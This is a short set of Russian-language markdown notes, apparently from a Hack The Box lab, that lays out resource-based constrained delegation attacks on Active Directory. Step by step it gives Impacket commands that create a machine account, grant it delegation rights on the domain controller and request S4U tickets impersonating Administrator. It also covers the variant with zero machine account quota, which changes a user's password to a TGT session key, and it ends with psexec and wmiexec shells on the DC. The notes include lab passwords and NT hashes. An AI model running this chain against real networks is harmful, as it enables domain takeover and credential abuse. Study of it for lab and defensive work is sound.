#AD #attacks #windows #linux #delegation #rbcd #linux 

# Проведение атаки при MachineAccountQuota > 0
#### 1) Создание аккаунта УЗ компьютера
```bash
addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes
```

#### 2) Добавление учетки в список доверенных на (DC)
```bash
python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
```

#### 3) Запрос на S4U2Self и S4U2Proxy
```bash
getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
```

#### 4) Получение доступа над машиной 
```bash
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass dc01.inlanefreight.local
```


# Проведение атаки при MachineAccountQuota == 0

> Атака ["Wagging the Dog"](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

Наша [атака](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) 

Нам  нужен сеансовый ключ, для этого нам нужен TGT, а для него NT hash
### 1) Получение TGT с помощью хэша NT
```bash
pypykatz crypto nt 'B3thR!ch@rd$'

getTGT.py INLANEFREIGHT.LOCAL/beth.richards -hashes :de3d16603d7ded97bb47cd6641b1a392 -dc-ip 10.129.205.35
```

### 2) Получение сеансового ключа
```bash
describeTicket.py beth.richards.ccache | grep 'Ticket Session Key'
```

### 3) Изменить пароль пользователя

Зная `TGT's session key`, мы можем изменить пароль пользователя на контроллере домена между запросами `S4U2Self` и `S4U2Proxy`. Для этого нужно использовать метод `SamrChangePasswordUser` и установить пароль пользователя в соответствии с сеансовым ключом TGT, чтобы KDC мог расшифровать билет. Чтобы изменить пароль пользователя в соответствии с сеансовым ключом, мы можем использовать `changepasswd.py`

```bash
changepasswd.py INLANEFREIGHT.LOCAL/beth.richards@10.129.205.35 -hashes :de3d16603d7ded97bb47cd6641b1a392 -newhash :7c3d8b8b135c7d574e423dcd826cab58
```

### 4) Запрос TGS
```bash
KRB5CCNAME=beth.richards.ccache 

getST.py -u2u -impersonate Administrator -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -no-pass INLANEFREIGHT.LOCAL/beth.richards -dc-ip 10.129.205.35
```

### 5) Получение доступа
```bash
KRB5CCNAME=Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache 

wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
```